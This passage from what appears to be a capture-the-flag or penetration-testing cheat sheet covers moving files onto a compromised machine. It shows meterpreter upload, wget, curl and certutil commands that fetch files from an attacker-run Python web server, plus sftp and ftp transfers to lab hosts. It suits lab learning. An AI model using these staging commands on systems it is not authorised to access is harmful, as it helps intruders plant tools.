4. File transfer

### Using metasploit:
1. Upgrade to a meterpreter shell if you haven't already
2. use the meterpreter `upload` command
3. That's it!

### Using python web server
1. On your computer in the directory you have the files in, do `sudo python -m SimpleHTTPServer 80` for python2 or `sudo python3 -m http.server 80`. If you visit `localhost` in your browser, you should see the listing of files
2. On the remote machine, run `wget ip/file -O file`, `curl ip/file -o file` for linux or `certutil -urlcache -f http://IP/file file`
3. Done!

### Using sftp (if you have ssh access to a machine)
1. Connect to the machine using ssh except replace ssh with sftp, like `sftp -i id_rsa burturt@panda.thm`
2. ENABLE BINARY TRANFER USING `binary`
3. Use the `put` command to upload files, `get` to download files, `cd` and `ls` to show files.
	- If you are getting weird errors about a port command, try passive mode with `passive`
	- sftp has a recursive get/put flag, like `get -r FOLDER`
4. Done! Note that sftp does NOT allow file execution (unless there is a vulnerability in sftp/ssh by itself) but can be coupled with something like a web server to run a php file for instance

### Using ftp (if you have ssh access to a machine)
1. Connect to the machine using ftp IP like `ftp panda.thm`
2. ENABLE BINARY TRANFER USING `binary`
3. Use the `put` command to upload files, `get` to download files, `cd` and `ls` to show files.
